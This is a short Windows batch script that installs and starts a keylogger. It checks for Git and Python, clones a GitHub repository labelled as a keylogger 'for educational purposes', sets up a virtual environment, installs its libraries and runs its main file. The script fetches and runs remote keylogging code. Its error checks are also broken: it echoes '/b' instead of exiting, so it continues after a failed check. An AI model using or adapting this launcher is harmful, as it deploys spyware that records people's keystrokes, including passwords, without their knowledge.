@echo off
git --version >nul 2>&1
if errorlevel 1(
    echo Git is not installed, please install git
    echo /b
)

python --version >nul 2>&1
if errorlevel 1 (
    echo Python is not installed. Please install it first!
    echo /b
)

echo Clonning the Keylogger...
git clone https://github.com/mrendermshka/KeyLogger-for-educational-purposes-

cd KeyLogger-for-educational-purposes-
py -m venv venv
if not exist requirements.txt (
    echo requirements.txt is not found.
) else (
    echo Installing the libs...
    venv\Scripts\pip install -r requirements.txt
)

echo Activating virtual envrionments..
if "%ComSpec%" == ""(
    venv\Scripts\activate
) else (
    call venv\Scripts\activate
)

echo Project is starting...
py 123.py
